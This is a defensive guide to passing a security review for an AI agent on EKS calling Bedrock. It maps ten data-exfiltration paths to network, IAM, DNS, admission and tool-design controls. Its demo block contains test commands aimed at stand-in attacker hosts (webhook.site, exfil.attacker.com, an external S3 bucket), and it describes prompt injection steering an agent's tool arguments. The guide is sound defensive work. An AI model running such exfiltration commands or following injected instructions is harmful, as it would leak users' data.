# What stops the agent from sending data somewhere it shouldn't

Reframe the question before you answer it. Security is asking a **behavioral** question ("will the agent misbehave?") and you cannot win that one — the model is non-deterministic and prompt injection is unsolved. Answer with a **structural** claim instead:

> "Nothing about the model's behavior is load-bearing. The pod has exactly one route off the node, and it terminates inside our VPC at a Bedrock endpoint. If the agent decides to exfiltrate, the packet has nowhere to go."

Then hand them evidence for each egress path. That's the whole review.

## The egress paths, and what closes each one

| # | Exfil path | Control | Evidence artifact |
|---|---|---|---|
| 1 | Agent tool makes an outbound HTTP call to attacker host | Default-deny egress `NetworkPolicy` on the namespace; agent nodegroup in private subnets with **no NAT gateway** and no IGW route | NetworkPolicy YAML + route table showing no `0.0.0.0/0` |
| 2 | Agent reaches Bedrock over the public internet | VPC **interface endpoint** for `com.amazonaws.<region>.bedrock-runtime` (+ `bedrock-agent-runtime` if used); SG on the endpoint allows only the agent SG | Terraform for the endpoint; `dig` from the pod resolving to a private IP |
| 3 | Agent invokes a model it shouldn't (or a Marketplace/third-party model) | IAM policy on the pod role scoped to explicit **model ARNs**, not `bedrock:*` / `Resource: "*"`; **VPC endpoint policy** re-asserting the same allowlist so it holds even if IAM drifts; SCP at the org level as backstop | The three policy documents, side by side |
| 4 | Agent writes to an S3 bucket / DynamoDB table outside our account | Pod role (IRSA or EKS Pod Identity) scoped per-service; `aws:ResourceOrgID` condition on S3/Bedrock endpoint policies blocks any cross-org resource | IAM Access Analyzer report showing no external access |
| 5 | Data leaks via DNS (the one they'll test you on) | Egress policy allows UDP/TCP 53 **only to kube-dns**; CoreDNS forwards to the VPC resolver only; no public resolver reachable | CoreDNS Corefile + NetworkPolicy |
| 6 | Pod bypasses NetworkPolicy via `hostNetwork` | Pod Security Admission `restricted` on the namespace; Kyverno/OPA policy denying `hostNetwork`, `hostPath`, privileged | Admission policy + a rejected-pod event in the audit log |
| 7 | Data leaks into third-party observability (Datadog, LangSmith, Langfuse SaaS) | **This is usually the real leak, and reviewers miss it.** Either self-host the trace store in-VPC, or redact prompt/completion bodies before the exporter and ship metadata only | Trace exporter config + a sample trace showing redacted payload |
| 8 | Prompt injection makes the agent call a *legitimate* tool with attacker-chosen args — `send_email(to=…)`, `http_get(url=…)` | Network controls don't help here; **tool design** does. No tool takes a free-form destination. Destinations come from a server-side allowlist keyed by an ID the model picks from. Any tool that can move data outside the trust boundary requires a human approval step | The tool/capability manifest: every tool, its schema, its blast radius |
| 9 | Runtime code fetch (`pip install`, curl \| sh in a sidecar) | Image signing + admission verification; immutable tags; no package manager egress (falls out of #1 anyway) | Cosign policy |
| 10 | Bedrock silently routes the request to another region | **Cross-region inference profiles** do exactly this. If data residency is in scope, pin to a single-region model ID, and set `bedrock:InferenceProfileArn` conditions / deny the cross-region profiles explicitly | The model ID list, with an explicit note that no CRIS profile is used |

## The demo that actually ends the meeting

Do this live. It converts an argument into an observation.

```bash
kubectl exec -it deploy/agent -n agents -- sh
curl -m 5 https://example.com                  # hangs, then times out
curl -m 5 https://webhook.site/<id>            # hangs, then times out
nslookup exfil.attacker.com                    # SERVFAIL / no route
aws bedrock-runtime invoke-model \
  --model-id anthropic.claude-...  ...         # 200
aws bedrock-runtime invoke-model \
  --model-id <a model not on the allowlist>    # AccessDeniedException
aws s3 cp secrets.txt s3://some-external-bucket # AccessDenied
```

Record it. That five-command transcript is worth more than any architecture diagram, because it demonstrates the control rather than asserting it.

## The evidence pack to hand them

1. **Network**: NetworkPolicy manifests, subnet route tables (no NAT/IGW), VPC endpoint Terraform + endpoint policy, security groups.
2. **Identity**: the pod's IAM role trust policy and permission policy, in full. Point at the absence of `*`.
3. **Model allowlist**: the model ARNs, in IAM *and* in the endpoint policy (defense in depth — one of them surviving a bad PR is the point).
4. **Flow logs**: a VPC Flow Logs query over the agent ENIs for the last 30 days, showing (a) `ACCEPT` only to the endpoint ENI, (b) the `REJECT` count, which should be near zero and explainable. This is your continuous proof, not a point-in-time one.
5. **CloudTrail**: `bedrock:InvokeModel` events with the pod's assumed-role identity, plus Bedrock **model invocation logging** delivering prompts/completions to an S3 bucket with Object Lock (WORM) if you need tamper-evident retention.
6. **Guardrails**: Bedrock Guardrails config — PII filters, denied topics — applied via `guardrailIdentifier` on every invoke, and enforced with an IAM condition so a call *without* the guardrail is denied. That last part is what makes it a control rather than a suggestion.
7. **Tool manifest**: every tool the agent can call, its input schema, and whether it can write anywhere outside the boundary. If the honest answer is "the agent only reads and only calls Bedrock," say that first — it's the strongest sentence in the review.
8. **Admission control**: the Kyverno/OPA policies, and evidence they're enforcing (not `Audit`).
9. **Bedrock data handling**: point them at AWS's contractual statement that Bedrock doesn't retain inputs/outputs or use them to train base models, and that inference is not sent to the model provider. Reviewers frequently believe "calling Claude" means "sending data to Anthropic." It doesn't — the request terminates in AWS's account boundary in your region.

## What to concede

Concede #8 honestly. Prompt injection means the agent's *decisions* are attacker-influenceable, so no control that depends on the model behaving correctly is a control. Say that out loud, then show that every one of your controls is external to the model. That's the answer they're actually looking for, and volunteering the limitation is what makes the rest credible.

If your agent currently has a general-purpose HTTP tool, a shell tool, or an unscoped S3 write, fix that before the review — there's no policy answer for it, and it's the first thing a good reviewer will find.
